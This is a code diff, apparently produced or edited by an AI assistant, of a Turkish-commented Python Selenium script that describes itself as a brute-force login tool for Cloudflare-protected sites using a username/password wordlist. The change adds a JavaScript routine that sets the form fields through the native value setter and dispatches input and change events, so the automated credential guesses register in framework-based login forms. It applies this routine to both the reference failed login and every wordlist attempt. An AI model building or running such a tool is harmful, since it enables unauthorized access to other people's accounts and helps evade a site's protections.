@@ -1,4 +1,4 @@
-# --- AI SIGNATURE: JS-INPUT-FIX-SCRIPT ---
+# --- AI SIGNATURE: JS-EVENT-FIX-SCRIPT-COMPLETE ---
 import argparse
 import sys
 import time
@@ -8,13 +8,26 @@ from colorama import Fore, Style, init
 try:
     from selenium import webdriver
     from selenium.webdriver.common.by import By
-    from selenium.webdriver.common.keys import Keys
     from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
 except ImportError:
     print(f"{Fore.RED}[!] Selenium kütüphanesi bulunamadı. Lütfen 'pip install selenium' ile kurun.")
     sys.exit(1)
 
 init(autoreset=True)
+
+def set_input_value_and_trigger_events(driver, element, value):
+    """Input değerini JS ile set eder ve modern frameworklerin kullandığı olayları tetikler."""
+    driver.execute_script("""
+        var input = arguments[0];
+        var value = arguments[1];
+        var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+        nativeInputValueSetter.call(input, value);
+        var event = new Event('input', { bubbles: true });
+        input.dispatchEvent(event);
+        var event2 = new Event('change', { bubbles: true });
+        input.dispatchEvent(event2);
+    """, element, value)
+
 print("DEBUG: Script başladı.")
 
 parser = argparse.ArgumentParser(description="Selenium ile Cloudflare korumalı login brute force aracı (combo wordlist)")
@@ -118,8 +131,8 @@ try:
     print(f"[+] Login formu bulundu: user='{user_input.get_attribute('name')}', pass='{pass_input.get_attribute('name')}'")
 
     print("DEBUG: Başarısız giriş denemesiyle referans alınıyor...")
-    driver.execute_script("arguments[0].value = 'wronguser';", user_input)
-    driver.execute_script("arguments[0].value = 'wrongpass';", pass_input)
+    set_input_value_and_trigger_events(driver, user_input, "wronguser")
+    set_input_value_and_trigger_events(driver, pass_input, "wrongpass")
     form.submit()
     time.sleep(3)
     fail_url = driver.current_url
@@ -145,11 +158,9 @@ try:
                         pass_input = inp
 
                 if user_input and pass_input:
-                    # GÜNCELLEME: JavaScript ile inputları doldur
-                    driver.execute_script("arguments[0].value = arguments[1];", user_input, username)
-                    driver.execute_script("arguments[0].value = arguments[1];", pass_input, password)
-                    
-                    # GÜNCELLEME: Formu submit et
+                    set_input_value_and_trigger_events(driver, user_input, username)
+                    set_input_value_and_trigger_events(driver, pass_input, password)
+                    time.sleep(0.1)
                     form.submit()
                     time.sleep(3)
 
@@ -185,4 +196,4 @@ finally:
     success_log.close()
     print("\n[+] Tarama tamamlandı.")
 
-# --- AI SIGNATURE: JS-INPUT-FIX-SCRIPT-BITIS --- 
+# --- AI SIGNATURE: JS-EVENT-FIX-SCRIPT-COMPLETE-BITIS --- 
